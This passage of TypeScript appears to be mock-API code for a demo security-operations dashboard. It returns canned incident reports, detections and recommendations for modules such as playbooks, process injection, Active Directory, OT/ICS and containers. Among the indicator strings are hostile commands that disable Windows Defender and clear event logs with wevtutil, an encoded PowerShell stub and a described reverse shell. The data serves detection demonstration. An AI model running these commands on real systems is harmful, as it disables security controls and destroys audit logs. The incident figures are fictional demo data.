  if (method === 'POST' && /^\/pb\/library\/\d+\/dry-run$/.test(p))         return ok({ ok: true, steps_passed: 8, steps_failed: 0, estimated_time_s: 42, warnings: [], step_results: [{ step: 'Trigger: Alert Created', status: 'ok', duration_ms: 12 }, { step: 'IF: severity == critical', status: 'ok', duration_ms: 3 }, { step: 'Approve Action', status: 'ok', duration_ms: 1 }, { step: 'Block IP', status: 'ok', duration_ms: 850 }, { step: 'Isolate Endpoint', status: 'ok', duration_ms: 1200 }, { step: 'Create Ticket', status: 'ok', duration_ms: 320 }, { step: 'Send Email', status: 'ok', duration_ms: 180 }, { step: 'Create Report', status: 'ok', duration_ms: 95 }] });
  if (method === 'POST' && /^\/pb\/approvals\/\d+\/decision$/.test(p))      return ok({ ok: true });
  if (method === 'POST' && /^\/pb\/marketplace\/[^/]+\/install$/.test(p))   return ok({ ok: true, playbook_id: 99 });
  if (method === 'POST' && p === '/pb/schedules')                            return ok({ id: Date.now() % 1000 + 1, ok: true });
  if (method === 'DELETE' && /^\/pb\/schedules\/\d+$/.test(p))              return ok({ ok: true });
  if (method === 'POST' && p === '/pb/ai')                                   return ok({ summary: 'Recommended 3-stage playbook: Alert triage → Approval gate → Automated response with parallel containment.', workflow_suggestion: ['Trigger: Alert Created', 'IF: severity == critical', 'PARALLEL', 'Block IP | Isolate Endpoint', 'Approve Action', 'Create Ticket', 'Send Email', 'Create Report'], optimizations: ['Add PARALLEL step to run Block IP and Send Email simultaneously — saves ~1.2s per execution', 'Cache threat intel lookups with 10-minute TTL to reduce API calls by 60%', 'Skip approval gate for known-bad IOC category to reduce MTTR by 8 minutes'], explanation: 'This workflow provides immediate containment with human approval gate to prevent false-positive isolation. Parallel execution of blocking actions minimizes response time.', warnings: ['Ensure agent is online before Isolate Endpoint step — add pre-check condition', 'Jira rate limits may delay ticket creation under high load — add retry with backoff'] });
  if (method === 'POST' && p === '/pb/report')                               return ok({ title: 'SOAR Automation Report — July 2026', generated_at: new Date().toISOString(), report_type: 'executive', classification: 'CONFIDENTIAL', executive_summary: 'The SOAR platform processed 247 automated responses this period, achieving 94.7% success rate and saving an estimated 68 analyst hours. Three critical incidents were fully contained without human intervention within SLA.', key_metrics: { total_executions: 247, success_rate: 94.7, analyst_hours_saved: 68, avg_response_time_s: 38, mttr_improvement: '42%' }, top_playbooks: [{ name: 'IOC Block', runs: 128, success_rate: 99.2 }, { name: 'Ransomware Response', runs: 47, success_rate: 94.5 }, { name: 'Phishing Response', runs: 31, success_rate: 97.0 }], incidents_contained: 31, false_positive_rate: 5.3, recommendations: ['Automate password spray detection — currently 100% manual', 'Add approval bypass for low-risk IOC blocks to improve speed', 'Review 8 failed Isolate Endpoint steps — agent connectivity issue'] });

  // ── Cases Enterprise — mutation stubs ────────────────────────────────────
  if (method === 'POST' && p === '/cases')                              return ok({ id: 1, case_id: 'CASE-2026-0001', ok: true });
  if (method === 'PATCH' && /^\/cases\/\d+$/.test(p))                  return ok({ ok: true });
  if (method === 'DELETE' && /^\/cases\/\d+$/.test(p))                 return ok({ ok: true });
  if (method === 'POST' && /^\/cases\/\d+\/tasks$/.test(p))            return ok({ id: Date.now() % 1000 + 10, ok: true });
  if (method === 'PATCH' && /^\/cases\/\d+\/tasks\/\d+$/.test(p))      return ok({ ok: true });
  if (method === 'POST' && /^\/cases\/\d+\/evidence$/.test(p))         return ok({ id: Date.now() % 1000 + 10, evidence_id: `EVD-${Date.now() % 9999}`, ok: true });
  if (method === 'POST' && /^\/cases\/\d+\/notes$/.test(p))            return ok({ id: Date.now() % 1000 + 10, ok: true });
  if (method === 'POST' && /^\/cases\/\d+\/comments$/.test(p))         return ok({ id: Date.now() % 1000 + 10, ok: true });
  if (method === 'POST' && p === '/cases/ai')                           return ok({ summary: 'CASE-2026-0001 involves a confirmed Cobalt Strike infection on WS-ANALYST-01. The attacker executed a malicious Word macro that spawned PowerShell, bypassed AMSI, disabled Windows Defender, and hollowed explorer.exe. Credential dumping from LSASS was also detected on DC-01.', key_findings: ['Cobalt Strike beacon via Process Hollowing (T1055.012) in explorer.exe', 'AMSI bypass + Defender disable chain before payload deployment', 'LSASS access with PROCESS_ALL_ACCESS — credential theft confirmed', 'C2 communication to 185.220.101.47:443 over HTTPS', '2 hosts affected: WS-ANALYST-01 (patient zero) and DC-01'], current_status: 'In Progress — containment phase. WS-ANALYST-01 isolated, memory collected. DC-01 credentials reset pending.', risk_level: 'critical', next_steps: ['Isolate DC-01 and collect forensic image', 'Reset all domain admin credentials including KRBTGT', 'Block C2 IP 185.220.101.47 at perimeter', 'Scan remaining endpoints for Cobalt Strike IOCs', 'Engage legal team if PII data was accessed'] });
  if (method === 'POST' && p === '/cases/report')                       return ok({ title: 'Incident Report — CASE-2026-0001: Cobalt Strike Ransomware Pre-Stage', executive_summary: 'On 2026-07-16 at 09:10 UTC a malicious Word document delivered via phishing email executed a Cobalt Strike beacon on WS-ANALYST-01 using macro → PowerShell → AMSI bypass → Process Hollowing. The attacker established C2 communications and accessed LSASS on DC-01, suggesting credential theft as a precursor to lateral movement or ransomware deployment. Containment was initiated at 09:50 UTC, 40 minutes after initial detection.', timeline: ['09:10 — Phishing email opened by j.smith on WS-ANALYST-01', '09:12 — WINWORD.EXE spawned PowerShell with -nop -enc flag', '09:14 — AMSI bypass via reflection patch executed', '09:15 — Windows Defender real-time monitoring disabled', '09:16 — Security + System event logs cleared via wevtutil', '09:18 — Process Hollowing into explorer.exe (PID 4512)', '09:22 — C2 beacon to 185.220.101.47:443', '09:31 — LSASS accessed on DC-01 with PROCESS_ALL_ACCESS', '09:50 — WS-ANALYST-01 isolated by SOC', '10:20 — Case escalated to Tier 3'], technical_findings: ['Malware family: Cobalt Strike Beacon 4.x (confidence: 97%)', 'Initial access: Phishing with malicious DOCX macro (T1566.001)', 'Execution: PowerShell -nop -enc (T1059.001)', 'Defense evasion: AMSI bypass (T1562.001), Defender disable (T1562.001), Log clearing (T1070.001)', 'Process injection: Process Hollowing into explorer.exe (T1055.012)', 'C2: HTTPS to 185.220.101.47:443 — Cobalt Strike Team Server'], iocs: ['SHA256: 3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f (malicious DOCX)', 'IP: 185.220.101.47 (Cobalt Strike C2)', 'Domain: update.microsoft-cdn[.]net (C2 redirect)', 'Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware = 1'], recommendations: ['Deploy Credential Guard and HVCI to prevent future AMSI bypasses', 'Enforce macro execution policy — block all unsigned macros', 'Implement immutable logging (forward to SIEM before local write)', 'Enable Protected Users security group for all privileged accounts'], lessons_learned: ['Phishing simulation needed — user clicked suspicious email from unknown sender', 'AMSI bypass detection rule was not enabled on WS-ANALYST-01', 'Event log forwarding was not configured — clearing succeeded'], classification: 'TLP:AMBER' });

  // ── Defense Evasion Enterprise — mutation stubs ──────────────────────────
  if (method === 'POST' && p === '/de/ai')       return ok({ verdict: 'confirmed_evasion', confidence: 96, technique: 'AMSI Bypass → Defender Disable → Log Clearing', mitre_id: 'T1562.001', explanation: 'powershell.exe (PID 7142) executed a known AMSI bypass patch via reflection, then disabled Windows Defender real-time protection via Set-MpPreference, and finally cleared the Security and System event logs using wevtutil. This three-stage chain is consistent with pre-ransomware staging — attackers disable detection before deploying the payload.', indicators: ['powershell.exe -nop -enc SQBFAF... (AMSI bypass reflection patch)', 'Set-MpPreference -DisableRealtimeMonitoring $true', 'wevtutil cl Security && wevtutil cl System', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware = 1'], attack_chain: ['1. PowerShell encoded command launched (T1027.010)', '2. AMSI bypass via reflection patching (T1562.001)', '3. Defender real-time monitoring disabled (T1562.001)', '4. Security + System event logs cleared (T1070.001)', '5. Payload staged for execution'], recommended_actions: ['Isolate WS-ANALYST-01 immediately', 'Re-enable Windows Defender and force definition update', 'Restore event log policy via GPO', 'Kill powershell.exe (PID 7142) and collect memory dump', 'Trigger SOAR playbook DE-RESPONSE-01'] });
  if (method === 'POST' && p === '/de/response') return ok({ ok: true, action: 'restart_security_services', hostname: 'WS-ANALYST-01', message: 'Security services restarted: Windows Defender, EDR Agent, Sysmon, Audit logging' });
  if (method === 'POST' && p === '/de/report')   return ok({ title: 'Defense Evasion Security Report — Executive Summary', executive_summary: 'Over the last 24 hours, 9 defense evasion events were detected across 4 endpoints. The most critical finding is a confirmed Cobalt Strike pre-deployment chain: AMSI bypass, Defender disable, and event log clearing on WS-ANALYST-01 within a 12-minute window. Two security controls (Windows Defender, Audit Logging) are currently degraded. MITRE TA0005 coverage stands at 72%, with network evasion and container evasion as the weakest areas.', key_findings: ['AMSI bypass + Defender disable + log clearing chain on WS-ANALYST-01 — ransomware pre-staging', 'Windows Defender disabled via registry key on DC-01 (T1562.001)', 'Security and System event logs cleared via wevtutil (T1070.001)', 'certutil.exe used as downloader on WS-DEV-03 (T1218 LOLBin)', 'PowerShell encoded commands with -nop flag on 3 endpoints (T1027.010)'], mitre_techniques: ['T1562.001', 'T1070.001', 'T1027.010', 'T1218', 'T1036.005', 'T1112'], risk_breakdown: { critical: 4, high: 3, medium: 2 }, top_recommendations: [{ priority: 1, action: 'Deploy Credential Guard and HVCI on all endpoints to prevent AMSI bypass via reflection', estimated_effort: '1-2 days' }, { priority: 2, action: 'Enforce tamper protection in Microsoft Defender for Endpoint policy', estimated_effort: '2 hours' }, { priority: 3, action: 'Implement Windows Event Forwarding with immutable SIEM destination to prevent log clearing', estimated_effort: '3-5 days' }], metrics: { total_events: 9, tamper_events: 4, disabled_controls: 2 } });

  // ── Process Injection Enterprise — mutation stubs ────────────────────────
  if (method === 'POST' && p === '/pi/ai')       return ok({ verdict: 'malicious', confidence: 97, technique: 'Process Hollowing', mitre_technique: 'T1055.012', explanation: 'WINWORD.EXE (PID 8832) spawned PowerShell with -nop -enc flags and immediately opened a process handle to explorer.exe with PROCESS_VM_WRITE access. The encoded command decodes to a Cobalt Strike stager downloading a stage-2 beacon from 185.220.101.47. Process Hollowing was used to unmap explorer.exe\'s legitimate PE image and replace it with a decrypted payload in memory.', indicators: ['WINWORD.EXE → powershell.exe -nop -enc SQBFAF...', 'OpenProcess(PROCESS_VM_WRITE, explorer.exe)', 'NtUnmapViewOfSection + NtWriteVirtualMemory sequence detected', 'PE header magic MZ at 0x0000022000000000 in unbacked region', 'C2 connection to 185.220.101.47:443'], recommended_actions: ['Kill PID 8832 (WINWORD.EXE) and PID 7142 (powershell.exe) immediately', 'Isolate WS-ANALYST-01 from the network', 'Dump memory from explorer.exe (PID 4512) for forensic analysis', 'Block outbound connections to 185.220.101.47', 'Initiate SOAR playbook: PI-RESPONSE-01'] });
  if (method === 'POST' && p === '/pi/response') return ok({ ok: true, action: 'kill_process', target: 'explorer.exe:4512', hostname: 'WS-ANALYST-01', message: 'Process terminated via TerminateProcess — PE hollow completed before kill, memory dump preserved for forensics.' });
  if (method === 'POST' && p === '/pi/report')   return ok({ title: 'Process Injection & Memory Forensics Security Report', executive_summary: '6 process injection events were detected across 3 endpoints in the last 24 hours. The most critical finding is a confirmed Cobalt Strike beacon using Process Hollowing (T1055.012) operating from within explorer.exe on WS-ANALYST-01. LSASS was accessed with PROCESS_ALL_ACCESS from a PowerShell process spawned by a malicious WINWORD.EXE macro. Immediate containment and credential reset are required.', key_findings: ['Cobalt Strike Process Hollowing in explorer.exe (PID 4512) on WS-ANALYST-01', 'WINWORD.EXE → PowerShell macro execution chain with -nop -enc flags (T1059.001)', 'LSASS accessed with PROCESS_ALL_ACCESS — credential dump likely (T1003.001)', 'Unsigned DLL injected.dll and hidden module detected in explorer.exe', 'Outbound C2 traffic to 185.220.101.47:443 from hollowed explorer.exe'], techniques_detected: ['Process Hollowing (T1055.012)', 'DLL Injection (T1055.001)', 'APC Injection (T1055.004)', 'Reflective DLL Loading (T1055)', 'Malicious Macro Execution (T1059.001)'], risk_breakdown: { critical: 3, high: 2, medium: 1 }, top_recommendations: [{ priority: 1, action: 'Isolate WS-ANALYST-01 and DC-01, initiate full incident response', estimated_effort: 'Immediate' }, { priority: 2, action: 'Reset all credentials for users active on affected endpoints', estimated_effort: '2-4 hours' }, { priority: 3, action: 'Deploy memory integrity enforcement (Credential Guard, HVCI)', estimated_effort: '1-2 days' }], metrics: { total_injections: 6, critical_alerts: 3, affected_hosts: 3 } });

  // ── OT/ICS Security Enterprise — mutation stubs ──────────────────────────
  if (method === 'POST' && p === '/ot/response')   return ok({ ok: true, action: 'notify_operators', message: 'Operators notified via alarm system and dashboard alert', requires_approval: false, response_mode: 'alert_only', safety_note: 'All actions that may affect physical operations require explicit operator approval before execution.' });
  if (method === 'POST' && p === '/ot/ai')         return ok({ verdict: 'confirmed_threat', confidence: 96, threat_technique: 'Unauthorized PLC Programming Outside Maintenance Window', mitre_ics_technique: 'T0836', explanation: 'An engineering workstation (EWS-SIEMENS-01, 10.10.0.5) transmitted Modbus Function Code 0x10 (Write Multiple Registers) commands to PLC-UNIT-01 at 02:34 UTC — outside the approved maintenance window of 06:00–08:00 on Saturdays. This pattern is consistent with unauthorized PLC reprogramming, which could alter control logic and cause physical process manipulation.', ot_impact: 'Unauthorised changes to PLC register values could alter setpoints, disable safety interlocks, or cause equipment damage or process shutdown.', recommended_actions: ['Immediately quarantine EWS-SIEMENS-01 from the OT network', 'Review PLC-UNIT-01 configuration against last known good backup', 'Verify physical process is operating within expected parameters', 'Initiate OT incident response procedure OT-IRP-003'], safety_note: 'Do NOT reboot PLC-UNIT-01 while production is running — coordinate with operations team before any remediation that touches control logic.' });
  if (method === 'POST' && p === '/ot/report')     return ok({ title: 'Executive OT/ICS Security Assessment Report', executive_summary: 'Your OT environment spans 3 industrial sites with 47 devices across 5 Purdue levels. The most critical finding is unauthorized PLC programming detected from EWS-SIEMENS-01 outside the approved maintenance window, consistent with early-stage attacker activity. Two OT assets are internet-reachable via misconfigured firewall rules. Overall IEC 62443 compliance posture is 58% against a target of 80%.', key_findings: ['Unauthorized PLC write commands from EWS-SIEMENS-01 outside maintenance window (T0836)', 'PLC-UNIT-01 internet-reachable via misconfigured DMZ firewall rule', 'HMI-CONTROL-01 running Windows 7 EOL — no security patches since January 2020', 'RTU-FIELD-03 using DNP3 without authentication — MITM attack possible', '6 devices with default credentials — Shodan-indexed vendor default passwords'], ot_specific_risks: ['Safety system (SIS) at Reactor-2 has no independent network monitoring', 'No air-gap between IT and OT — VLAN-only separation in place', 'Engineering workstations share USB access — removable media not restricted'], risk_breakdown: { critical: 4, high: 7, medium: 11 }, top_recommendations: [{ priority: 1, action: 'Remove internet firewall rules exposing PLC-UNIT-01 and HMI-CONTROL-01', estimated_effort: '2 hours', safety_note: 'Coordinate with network team — verify no legitimate remote access depends on these rules before removal' }, { priority: 2, action: 'Enable DNP3 Secure Authentication v5 on all RTU field devices', estimated_effort: '1–2 days', safety_note: 'Schedule during approved maintenance window; test in staging first' }, { priority: 3, action: 'Deploy OT-specific firewall (Purdue Level 3.5 DMZ) to replace VLAN-only separation', estimated_effort: '2–4 weeks', safety_note: 'Requires careful traffic baselining to avoid blocking legitimate OT communications' }], metrics: { total_assets: 47, critical_alerts: 6, open_vulnerabilities: 12, active_incidents: 2 } });

  // ── Supply Chain Security Enterprise — mutation stubs ────────────────────
  if (method === 'POST' && p === '/supply-chain/policies')                  return ok({ id: Date.now() % 1000 + 100, ok: true });
  if (method === 'PATCH' && /^\/supply-chain\/policies\/\d+$/.test(p))     return ok({ ok: true });
  if (method === 'DELETE' && /^\/supply-chain\/policies\/\d+$/.test(p))    return ok({ ok: true });
  if (method === 'POST' && p === '/supply-chain/response')                  return ok({ ok: true, action: 'block_build', message: 'Build blocked — pipeline will not proceed until issue is resolved' });
  if (method === 'POST' && p === '/supply-chain/ai')                        return ok({ verdict: 'risky', confidence: 91, explanation: 'This dependency (log4j-core 2.14.1) is affected by CVE-2021-44228 (CVSS 10.0), one of the most critical vulnerabilities in the past decade. It allows remote code execution via JNDI lookup injection in log messages and is actively exploited by ransomware groups. The package is used in 3 of your internal services and should be updated immediately to ≥2.17.1.', risk_factors: ['CVE-2021-44228 CVSS 10.0 — Log4Shell RCE', 'Listed in CISA KEV catalog', 'Active exploitation by Conti and other ransomware groups', 'Vulnerable version used in production services'], recommended_actions: ['Update log4j-core to 2.17.1 or later immediately', 'Apply -Dlog4j2.formatMsgNoLookups=true as temporary mitigation', 'Scan production logs for JNDI exploit attempts', 'Audit all services that import log4j transitively'], severity: 'critical' });
  if (method === 'POST' && p === '/supply-chain/report')                    return ok({ title: 'Executive Supply Chain Security Report', executive_summary: 'Your software supply chain spans 12 repositories, 847 dependencies, and 8 active build pipelines. The most critical finding is the presence of log4j-core 2.14.1 (CVE-2021-44228, CVSS 10.0) in 3 production services. 11 open secret findings were detected in source code, including 3 AWS access keys. Overall SLSA posture is Level 1 against a target of Level 3.', key_findings: ['log4j-core 2.14.1 affected by Log4Shell (CVE-2021-44228, CVSS 10.0) in 3 services', '3 AWS access keys committed to source code repositories', 'event-stream@3.3.6 — compromised npm package detected as transitive dependency', '60% of artifacts lack cryptographic signing or provenance attestation', 'SLSA Level 1 — no build provenance for 4 of 8 pipelines'], risk_breakdown: { critical: 3, high: 6, medium: 12 }, top_recommendations: [{ priority: 1, action: 'Update log4j-core to ≥2.17.1 in all affected services immediately', estimated_effort: '2 hours' }, { priority: 2, action: 'Rotate all 3 AWS access keys committed to source code', estimated_effort: '4 hours' }, { priority: 3, action: 'Remove event-stream from dependency tree', estimated_effort: '1 hour' }], metrics: { repositories: 12, dependencies: 847, critical_cves: 3, secret_findings: 11 } });

  // ── AD Security Enterprise — mutation stubs ──────────────────────────────
  if (method === 'POST' && p === '/ad/response') return ok({ ok: true, action: 'disable_user', message: 'User account disabled in Active Directory' });
  if (method === 'POST' && p === '/ad/ai') return ok({ verdict: 'confirmed_attack', confidence: 97, attack_technique: 'Kerberoasting', mitre_technique: 'T1558.003', explanation: 'The service account svc_backup requested an unusually high number of Kerberos service tickets (23 in 4 minutes) for multiple SPNs across the domain. This pattern is consistent with automated Kerberoasting tooling (Rubeus or Impacket GetUserSPNs). The tickets were requested using RC4-HMAC encryption rather than AES256, indicating an attacker is targeting crackable ticket types.', recommended_actions: ['Immediately reset the password of svc_backup to a 25+ character random password', 'Remove svc_backup from Domain Admins — it has no business justification', 'Enable AES256 encryption for all service accounts (disable RC4)', 'Add all privileged service accounts to Protected Users group', 'Alert and monitor for offline cracking of the extracted ticket hash'], severity: 'critical' });
  if (method === 'POST' && p === '/ad/report') return ok({ title: 'Executive Active Directory Security Report', executive_summary: 'Your Active Directory environment spans 2 domains with 1,247 users and 3 Domain Controllers. A Kerberoasting campaign attributed to Lazarus Group was detected targeting service accounts with weak passwords and RC4 encryption. DCSync was attempted from a compromised workstation — no successful exfiltration confirmed. Immediate remediation of 10 critical hygiene failures is recommended.', key_findings: ['Kerberoasting campaign targeting 7 SPNs — attributed to Lazarus Group (T1558.003)', 'DCSync attempt from WS-INFECTED01 — likely Mimikatz (T1003.006)', 'svc_backup is member of Domain Admins with password last changed 847 days ago', '3 computers with unconstrained Kerberos delegation (TGT theft risk)', 'LDAP signing not required on DC01 — anonymous bind possible'], risk_breakdown: { critical: 4, high: 6, medium: 8 }, top_recommendations: [{ priority: 1, action: 'Reset all service account passwords to 25+ characters and enforce AES256', estimated_effort: '2 hours' }, { priority: 2, action: 'Remove unconstrained delegation from FILE01, PRINT01, WEB-SRV01', estimated_effort: '1 hour' }, { priority: 3, action: 'Enable LDAP signing and channel binding on all DCs', estimated_effort: '30 minutes' }], metrics: { domains: 2, users: 1247, attacks: 8, high_risk_users: 14 } });

  // ── Container Security / Kubernetes — mutation stubs ─────────────────────
  if (method === 'POST' && p === '/containers/response') return ok({ ok: true, action: 'kill_container', message: 'Container killed via SIGKILL' });
  if (method === 'POST' && p === '/containers/ai') return ok({ verdict: 'confirmed_threat', confidence: 94, explanation: 'This alert indicates a reverse shell was spawned from inside the nginx container in the production namespace. The process tree shows nginx spawning bash, which then initiated an outbound TCP connection to 185.220.101.47:4444 — a known C2 server associated with TeamTNT.', attack_stage: 'execution', mitre_techniques: ['T1059.004', 'T1611', 'T1071.001'], recommended_actions: ['Kill container immediately', 'Isolate node from cluster network', 'Review image nginx:1.19 for embedded backdoor', 'Rotate all secrets mounted in this pod', 'Enable Falco runtime detection for shell-in-container rules'] });
  if (method === 'POST' && p === '/containers/report') return ok({ title: 'Executive Container & Kubernetes Security Report', executive_summary: 'Your Kubernetes environment spans 3 clusters with 18 nodes and 147 running pods. The security posture review identified 14 images with critical CVEs, 6 open runtime alerts including a confirmed reverse shell incident in production, and an overall compliance score of 74% against CIS Kubernetes Benchmark. Immediate remediation is recommended for privileged container workloads and overly permissive RBAC bindings.', key_findings: ['CVE-2024-21626 (CVSS 9.9) — container escape via runc affects 8 nodes', 'Reverse shell detected in production/nginx-pod — TeamTNT attribution', '4 service accounts with wildcard cluster-admin permissions', '11 privileged pods running in production namespace', 'DKIM/image signing missing on 60% of deployed images'], risk_breakdown: { critical: 8, high: 14, medium: 22 }, top_recommendations: [{ priority: 1, action: 'Patch runc to ≥1.1.12 across all nodes immediately', estimated_effort: '4 hours' }, { priority: 2, action: 'Remove wildcard permissions from default service accounts', estimated_effort: '1 day' }, { priority: 3, action: 'Enforce Gatekeeper/OPA policy to block privileged containers', estimated_effort: '2 days' }], metrics: { clusters: 3, nodes: 18, pods: 147, vuln_images: 14, runtime_alerts: 6 } });

  // ── Email Security Enterprise — mutation stubs ────────────────────────────
  if (method === 'POST' && p === '/email/policies')  return ok({ id: Date.now() % 1000 + 100, ok: true });
  if (method === 'PATCH' && /^\/email\/policies\/\d+$/.test(p))  return ok({ ok: true });
  if (method === 'DELETE' && /^\/email\/policies\/\d+$/.test(p)) return ok({ ok: true });
  if (method === 'PATCH' && /^\/email\/reported\/\d+$/.test(p))  return ok({ ok: true });
  if (method === 'POST' && p === '/email/response') return ok({ ok: true, action: 'quarantine_email', message: 'Email moved to quarantine' });
  if (method === 'POST' && p === '/email/ai') return ok({ verdict: 'malicious', confidence: 96, threat_type: 'phishing', explanation: 'This message impersonates Microsoft and attempts to harvest Office 365 credentials via a fake login page. The URL redirects through a URL shortener before reaching a credential harvesting page mimicking the Microsoft login portal.', indicators: ['microsoft-secure-login.xyz (newly registered 3 days ago)', 'Redirect chain: bit.ly → 185.220.101.47 → fake-login-page.xyz', 'Login form submits credentials to attacker-controlled endpoint'], mitre_techniques: ['T1566.001', 'T1598.003', 'T1556'], recommended_actions: ['Block sender domain microsoft-secure-login.xyz', 'Pull and delete email from all mailboxes', 'Notify recipient and reset password if credentials entered', 'Add URL to blocklist at email gateway'], answer: 'This is a credential phishing attack impersonating Microsoft Office 365.' });
  if (method === 'POST' && p === '/email/report') return ok({ title: 'Executive Email Security Report', executive_summary: 'Your organization processed 48,312 emails in the reporting period. The email security gateway blocked 1,247 threats including 834 phishing attempts, 289 malware-laden attachments, and 124 BEC attempts. The most active threat actor was TA505, responsible for 18 phishing emails targeting the Finance department via fake invoice lures.', key_findings: ['834 phishing emails detected — 23% increase over prior period', 'TA505 campaign targeting Finance with Emotet-laden invoice attachments', '3 users clicked phishing links; no credential compromise confirmed', 'BEC attempt spoofing CEO requested $48,000 wire transfer — blocked', 'DMARC enforcement prevented 312 domain spoofing attempts'], risk_breakdown: { phishing: 834, malware: 289, bec: 124 }, top_recommendations: [{ priority: 1, action: 'Enforce DMARC reject policy on all owned domains', estimated_effort: '2 hours' }, { priority: 2, action: 'Enroll 3 high-risk users in mandatory phishing awareness training', estimated_effort: '1 day' }, { priority: 3, action: 'Implement QR code scanning in email gateway', estimated_effort: '1 week' }], metrics: { total_processed: 48312, blocked: 1247, threats: 1247 } });

  // All mutations → 403
  if (!['GET', 'HEAD'].includes(method.toUpperCase())) return demoBlock();

  // ── Auth ──────────────────────────────────────────────────────────────────
  if (p === '/auth/profile' || p === '/auth/me') {
    return ok({ id: 1, username: 'demo-viewer', email: 'demo@xcloak.tech', role: 'viewer', tenant_id: 9999, is_active: true, created_at: '2026-01-01T00:00:00Z' });
  }

  // ── Dashboard ─────────────────────────────────────────────────────────────
  if (p === '/dashboard/overview') return ok(dashboardOverview());
  if (p === '/dashboard/metrics')  return ok(dashboardMetrics(sp.get('range') || '24h'));

  // ── Alerts ────────────────────────────────────────────────────────────────
  if (p === '/alerts') return ok(D.alerts);
  if (p === '/alerts/paginated') {
    let arr = [...D.alerts];
    const sev  = sp.get('severity');
    const aid  = sp.get('agent_id');
    const stat = sp.get('status');
    if (sev  && sev  !== 'all') arr = arr.filter((a: any) => a.severity === sev);
    if (aid)                    arr = arr.filter((a: any) => String(a.agent_id) === aid);
    if (stat && stat !== 'all') arr = arr.filter((a: any) => a.status === stat);
    const pg = paginate(arr, sp);
    // alerts page reads result?.alerts; cloud/infra pages read r.data?.alerts
    return ok({ alerts: pg.data, page: pg.page, per_page: pg.per_page, total: pg.total, pages: pg.pages });
  }
  if (/^\/alerts\/\d+\/investigate$/.test(p)) {
    const id    = parseInt(p.split('/')[2]);
    const alert = D.alerts.find((a: any) => a.id === id);
    return ok({
      alert,
      threat_score:     45,
      correlated_rules: [],
      ioc_hits:         [],
      similar_alerts:   D.alerts.filter((a: any) => a.rule_name === alert?.rule_name && a.id !== id).slice(0, 3),
      suggested_cases:  [],
      related_alerts:   D.alerts.slice(0, 3),
      ioc_matches:      [],
      mitre:            {},
    });
  }

  // ── Incidents ─────────────────────────────────────────────────────────────
  if (p === '/incidents') return ok(D.incidents);
  if (p === '/incidents/paginated') {
    let arr = [...D.incidents];
    const st = sp.get('status');
    if (st && st !== 'all') arr = arr.filter((i: any) => i.status === st);
    const pg = paginate(arr, sp);
    // page reads data.data — use "data" key
    return ok({ data: pg.data, page: pg.page, per_page: pg.per_page, total: pg.total, pages: pg.pages });
  }
  if (/^\/incidents\/\d+$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.incidents.find((i: any) => i.id === id) ?? notFound().data);
  }
  if (/^\/incidents\/\d+\/events$/.test(p)) return ok([]);
  if (/^\/incidents\/\d+\/notes$/.test(p))  return ok([]);

  // ── Agents ────────────────────────────────────────────────────────────────
  if (p === '/agents') return ok(D.agents.map((a: any, i: number) => ({
    ...a,
    is_isolated:       i === 0,
    tamper_protection: i === 0 || i === 1,
    policy_count:      i < 2 ? 3 : 1,
    open_alert_count:  D.alerts.filter((al: any) => al.agent_id === a.id && al.status === 'open').length,
  })));
  if (/^\/agents\/\d+$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.agents.find((a: any) => a.id === id) ?? notFound().data);
  }
  if (/^\/agents\/\d+\/summary$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const ag = D.agents.find((a: any) => a.id === id);
    return ok({
      agent:       ag,
      alert_count: D.alerts.filter((a: any) => a.agent_id === id).length,
      vuln_count:  D.vulnerabilities.filter((v: any) => v.agent_id === id).length,
      processes:   D.endpoint_processes.filter((e: any) => e.agent_id === id).length,
      connections: D.endpoint_connections.filter((e: any) => e.agent_id === id).length,
      fim_alerts:  D.fim_alerts.filter((f: any) => f.agent_id === id).length,
      services:    0,
      packages:    0,
      users:       0,
    });
  }
  if (/^\/agents\/\d+\/processes$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.endpoint_processes.filter((e: any) => e.agent_id === id));
  }
  if (/^\/agents\/\d+\/connections$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.endpoint_connections.filter((e: any) => e.agent_id === id));
  }
  if (p === '/timeline') {
    const limit = parseInt(sp.get('limit') || '500');
    return ok(FORENSIC_TIMELINE.slice(0, limit));
  }
  if (/^\/agents\/\d+\/timeline$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const agentEvents = FORENSIC_TIMELINE.filter((e) => e.agent_id === id);
    if (agentEvents.length > 0) return ok(agentEvents);
    return ok(D.alerts.filter((a: any) => a.agent_id === id).slice(0, 30).map((a: any) => ({
      id:           a.id,
      event_type:   'alert',
      message:      a.log_message ?? a.rule_name ?? 'Security event',
      created_at:   a.created_at,
      severity:     a.severity,
      agent_id:     a.agent_id,
      mitre_technique: a.mitre_tactic,
    })));
  }
  if (/^\/agents\/\d+\/vulnerabilities$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.vulnerabilities.filter((v: any) => v.agent_id === id));
  }
  if (/^\/agents\/\d+\/risk$/.test(p))      return ok({ score: 72, factors: [] });
  if (/^\/agents\/\d+\/services$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const isFirst = id === D.agents[0]?.id;
    return ok([
      { service_name: 'sshd',         service_state: 'running', pid: 1234, start_type: 'automatic' },
      { service_name: 'nginx',         service_state: 'running', pid: 2345, start_type: 'automatic' },
      { service_name: 'xcloak-agent', service_state: 'running', pid: 3456, start_type: 'automatic' },
      { service_name: 'cron',          service_state: 'running', pid: 567,  start_type: 'automatic' },
      { service_name: 'rsyslog',       service_state: 'running', pid: 678,  start_type: 'automatic' },
      ...(isFirst ? [
        { service_name: 'cobalt-strike-beacon', service_state: 'running', pid: 9999, start_type: 'manual', suspicious: true },
      ] : []),
      { service_name: 'ufw',          service_state: 'running', pid: 789, start_type: 'automatic' },
    ]);
  }
  if (/^\/agents\/\d+\/users$/.test(p)) {
    return ok([
      { username: 'root',    uid: 0,    gid: 0,    shell: '/bin/bash',  home: '/root',       last_login: new Date(Date.now() - 3600000).toISOString() },
      { username: 'ubuntu',  uid: 1000, gid: 1000, shell: '/bin/bash',  home: '/home/ubuntu',last_login: new Date(Date.now() - 86400000).toISOString() },
